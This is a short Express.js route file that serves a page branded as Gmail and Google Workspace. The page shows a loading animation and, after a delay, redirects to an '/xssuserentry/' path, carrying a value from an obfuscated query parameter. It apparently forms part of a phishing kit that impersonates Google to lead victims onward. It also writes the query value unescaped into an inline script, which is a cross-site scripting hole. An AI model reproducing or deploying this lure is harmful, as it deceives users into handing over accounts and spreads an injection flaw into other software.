const express = require('express');
const path = require('path');
const router = express.Router();

router.use(express.static('public')); // Serve /images, etc.

router.get('/', (req, res) => {
  const data2 = req.query.dhugfr8gwevdhweqvru3g284ge2378wudbwjb;
  const url = `/xssuserentry/?egfhyubgdfshugwdyuge782er9ghqduqwbdajbqdaqbsdj=${data2}`;

  if (!data2) return res.render('error');

  const htmlContent = `
  
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Gmail</title>
  <link rel="shortcut icon" href="/images/image.png" type="image/png">
  <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 2500);
            </script> 
  

  <style>
    body {
      display: flex;
      flex-direction: column;
      justify-content: start;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    .gif-container {
      margin-top: 150px;
    }

    .container {
      position: relative;
      padding-top: 25px;
      width: 100%;
      max-width: 650px;
    }

    .underline-background {
      position: absolute;
      top: 0;
      left: 22%;
      width: 55%;
      height: 6px;
      background-color: #f1f3f4; /* Light white-gray */
      border-radius: 4px;
      z-index: 1;
    }

    .underline {
      position: absolute;
      top: 0;
      left: 22%;
      width: 55%;
      height: 6px;
      background-color: #ea4335; /* Red */
      border-radius: 4px;
      animation: grow 5s ease-in-out infinite alternate;
      z-index: 2;
    }

    .text {
      font-size: 38px;
      color: #5f6368; /* Gray */
      position: relative;
      z-index: 3;
      margin-top: 20px;
    }

    .text span {
      font-weight: bold;
    }

    /* Red line animation */
    @keyframes grow {
      0% {
        width: 10%;
      }
      50% {
        width: 30%;
      }
      100% {
        width: 54%;
      }
    }
  </style>
</head>
<body>

  <!-- GIF -->
  <div class="gif-container">
    <object data="/gmail_animation.gif" style="height:420px; width:550px"></object>
  </div>

  <!-- Red underline and text -->
  <div class="container">
    <div class="underline-background"></div> <!-- Fixed white line -->
    <div class="underline"></div> <!-- Animated red line -->
    <div class="text">
      <span>Google</span> Workspace
    </div>
  </div>

</body>
</html>
`;

    res.send(htmlContent);
});

module.exports = router;
